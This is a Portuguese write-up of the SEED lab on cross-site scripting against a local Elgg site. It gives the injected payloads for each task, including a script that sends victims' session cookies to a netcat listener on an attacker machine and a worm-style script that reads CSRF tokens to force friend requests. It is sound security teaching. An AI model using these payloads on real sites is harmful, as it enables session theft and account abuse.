## Configuração do Ambiente

Primeiro é preciso adicionar uma entrada no `/etc/hosts` (com sudo):

```
10.9.0.5    www.seed-server.com
```

Depois descarregar o `Labsetup.zip`, descompactar e dentro da pasta correr:

```bash
docker compose build
docker compose up
```

Aceder a `http://www.seed-server.com` no browser — deve aparecer a página do Elgg.

Para ver os pedidos HTTP usámos as Developer Tools do browser (separador Network).

## Task 1 — Alerta com JavaScript

No campo "About me" do perfil do Samy (em modo de edição HTML), injetar:

```html
<script>alert('XSS');</script>
```

Ao visitar o perfil aparece uma caixa de alerta, o que confirma que o browser está a executar o script.

---

## Task 2 — Mostrar os cookies

Mesmo princípio, mas desta vez o script mostra os cookies da sessão:

```html
<script>alert(document.cookie);</script>
```

Ao visitar o perfil, o alerta mostra os cookies do utilizador que está a ver a página (incluindo o cookie de sessão do Elgg).

---

## Task 3 — Roubar os cookies

O objetivo aqui é enviar os cookies para uma máquina controlada pelo atacante. Pusemos o `netcat` à escuta na porta 5555:

```bash
nc -lknv 5555
```

E injetámos este script no perfil:

```html
<script>
  document.write('<img src="http://10.9.0.1:5555?c=' + escape(document.cookie) + '" />');
</script>
```

Quando a vítima visita o perfil, o browser tenta carregar a imagem e manda os cookies como parâmetro na URL. O netcat recebe o pedido e conseguimos ver os cookies.

## Task 4 — Adicionar o Samy como amigo automaticamente

O Elgg protege-se contra CSRF com tokens (`__elgg_ts` e `__elgg_token`). Para o ataque funcionar, o script tem de ler esses tokens da página e incluí-los no pedido.

Payload injetado no "About me" do Samy:

```html
<script type="text/javascript">
window.onload = function() {
  var ts    = "&__elgg_ts="    + elgg.security.token.__elgg_ts;
  var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

  var sendurl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;

  var Ajax = new XMLHttpRequest();
  Ajax.open("GET", sendurl, true);
  Ajax.send();
}
</script>
```

Qualquer utilizador que visite o perfil do Samy fica automaticamente a segui-lo, sem carregar em nada.
